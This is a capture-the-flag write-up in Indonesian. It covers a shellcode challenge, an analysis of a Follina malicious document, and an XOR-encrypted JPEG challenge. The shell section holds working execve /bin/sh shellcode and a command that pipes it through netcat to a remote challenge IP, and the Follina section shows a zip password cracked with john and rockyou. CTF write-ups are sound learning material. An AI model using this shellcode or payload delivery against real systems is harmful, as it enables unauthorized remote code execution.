## shell (4 solved)

```asm
section .text
    global _start
_start:
    xor rax, rax
    push rax
    mov rdx, rsp
    mov rbx, 0x0068732f6e69622f2f
    push rbx
    mov rdi, rsp
    push rax
    push rdi
    mov rsi,rsp
    add rax, 59
    syscall
```

inputkan untuk mengekstrak hex instruksi assembly-nya:
```sh
nasm -gstabs -f elf64 -o bin_sh.o bin_sh.asm && ld bin_sh.o -o bin_sh && ./bin_sh
objdump -M Intel -d ./bin_sh |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
```

Lalu masukkan kedalam payload
```sh
(python2 -c 'print "\x48\x31\xc0\x50\x48\x89\xe2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\  
x48\x89\xe7\x50\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05"';cat) | nc 101.50.0.66 9002
```

## Follina (9 solved)

Untuk folina saya melihat referensi kode dari github john hammond https://github.com/JohnHammond/msdt-follina

```python
...snip...
    # Modify the Word skeleton to include our HTTP server
    document_rels_path = os.path.join(
        staging_dir, doc_suffix, "word", "_rels", "document.xml.rels"
    )
...snip...
```

disini kita dapat menyimpulkan bahwa filenya ada di `/word/_rels/document.xml.rels`

kita disasamble doc-nya menggunakan binwalk
```sh
binwalk follina.doc -e
```

kita masuk ke path filenya dan mendapatkan
```
...snip...Target="https://github.com/banuaa/folliware!"...snip...
```

Kita akan diarahkan ke githubnya mas banua. Kita download file yang ada di sana, lalu bruteforce zipnya menggunakan john

```sh
zip2john flag.zip > brute.hash
john --wordlist=/usr/share/wordlists/rockyou.txt brute.hash
```

## ROXYNAM (6 solved)
```python
FLG_ENC = "flag.jpg.enc"
EX_JPG = "example.jpg"

with open(FLG_ENC, "rb") as f:
    FLG_BIN = f.read()[:3]
    
with open(EX_JPG, "rb") as f:
    EX_BIN = f.read()[:3]

# search the key
key = ""
for i, j in zip(FLG_BIN, EX_BIN):
    for k in range(0xff):
        if i ^ k == j:
            key += ('{:02x}'.format(k))
            break
key = bytes.fromhex(key).decode()

with open(FLG_ENC, "rb") as f:
    FLG_BIN = f.read()

# xor all the binary in the flag.jpg.enc
jpg_flag = bytes([x ^ ord(key[i % len(key)]) for i, x in enumerate(FLG_BIN)])
with open("flag.jpg", "wb") as f:
    f.write(jpg_flag)
```

disini saya hanya membandingkan header flag jpg dengan jpg lain. Kemudian men-xornya dengan key yang ditemukan. 